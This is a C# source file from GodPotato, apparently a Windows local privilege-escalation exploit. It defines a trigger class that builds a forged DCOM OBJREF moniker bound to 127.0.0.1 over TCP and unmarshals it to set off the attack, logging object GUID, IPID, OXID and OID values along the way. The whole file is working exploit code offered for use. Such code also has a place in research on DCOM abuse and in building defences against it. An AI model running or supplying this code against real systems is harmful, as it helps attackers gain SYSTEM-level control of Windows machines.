using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace GodPotato.NativeAPI{

    [ComVisible(true)]
    public class GodPotatoUnmarshalTrigger  {
        private readonly static Guid IID_IUnknown = new Guid("{00000000-0000-0000-C000-000000000046}");
        private readonly static string binding = "127.0.0.1";
        private readonly static TowerProtocol towerProtocol = TowerProtocol.EPM_PROTOCOL_TCP;


        public object fakeObject = new object();
        public IntPtr pIUnknown;
        public IBindCtx bindCtx;
        public IMoniker moniker;

        private GodPotatoContext godPotatoContext;


        public GodPotatoUnmarshalTrigger(GodPotatoContext godPotatoContext) {
            this.godPotatoContext = godPotatoContext;


            if (!godPotatoContext.IsStart)
            {
                throw new Exception("GodPotatoContext was not initialized");
            }

            pIUnknown = Marshal.GetIUnknownForObject(fakeObject);
            NativeMethods.CreateBindCtx(0, out bindCtx);
            NativeMethods.CreateObjrefMoniker(pIUnknown, out moniker);

        }


        public int Trigger() {

            string ppszDisplayName;
            moniker.GetDisplayName(bindCtx, null, out ppszDisplayName);
            ppszDisplayName = ppszDisplayName.Replace("objref:", "").Replace(":", "");
            byte[] objrefBytes = Convert.FromBase64String(ppszDisplayName);

            ObjRef tmpObjRef = new ObjRef(objrefBytes);

            godPotatoContext.ConsoleWriter.WriteLine($"[*] DCOM obj GUID: {tmpObjRef.Guid}");
            godPotatoContext.ConsoleWriter.WriteLine($"[*] DCOM obj IPID: {tmpObjRef.StandardObjRef.IPID}");
            godPotatoContext.ConsoleWriter.WriteLine("[*] DCOM obj OXID: 0x{0:x}", tmpObjRef.StandardObjRef.OXID);
            godPotatoContext.ConsoleWriter.WriteLine("[*] DCOM obj OID: 0x{0:x}", tmpObjRef.StandardObjRef.OID);
            godPotatoContext.ConsoleWriter.WriteLine("[*] DCOM obj Flags: 0x{0:x}", tmpObjRef.StandardObjRef.Flags);
            godPotatoContext.ConsoleWriter.WriteLine("[*] DCOM obj PublicRefs: 0x{0:x}", tmpObjRef.StandardObjRef.PublicRefs);

            ObjRef objRef = new ObjRef(IID_IUnknown,
                  new ObjRef.Standard(0, 1, tmpObjRef.StandardObjRef.OXID, tmpObjRef.StandardObjRef.OID, tmpObjRef.StandardObjRef.IPID,
                    new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));
            byte[] data = objRef.GetBytes();

            godPotatoContext.ConsoleWriter.WriteLine($"[*] Marshal Object bytes len: {data.Length}");
            
            IntPtr ppv;

            godPotatoContext.ConsoleWriter.WriteLine($"[*] UnMarshal Object");
            return UnmarshalDCOM.UnmarshalObject(data,out ppv);
        }


    }
}
